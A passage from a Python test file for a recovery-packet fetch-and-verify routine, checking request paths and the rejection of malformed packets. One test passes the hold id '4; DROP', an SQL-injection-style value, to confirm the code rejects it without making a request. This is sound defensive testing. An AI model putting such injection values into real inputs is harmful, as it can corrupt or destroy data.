    asked: list[str] = []

    def get(path: str) -> dict:
        asked.append(path)
        return same

    fetched = attempt(rp.fetch_verified, get, project="p737")
    check(fetched.get("current") and fetched.get("packet") is same and asked == ["/api/recovery-packet", "/api/recovery-packet?hold=4"],
          f"with no packet, a consumer fetches one and checks it against a second read of the same hold: {asked}")
    asked.clear()
    check(attempt(rp.fetch_verified, get, project="p737", packet=packet).get("current") and asked == ["/api/recovery-packet?hold=4"],
          f"a packet it was handed is checked against the board's own, for its hold: {asked}")
    try:
        rp.fetch_verified(get, project="p737", packet={"hold": {"id": "4; DROP"}})
        said = ""
    except rp.PacketError as exc:
        said = str(exc)
    check("not a switchyard.recovery-packet" in said and len(asked) == 1, f"a packet without a hold number asks nothing: {said}")


def main() -> int:
    for name, case in sorted(globals().items()):
        if name.startswith("test_") and callable(case):
            case()
    print(f"recovery_packet_test: {CHECKS} checks ok")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
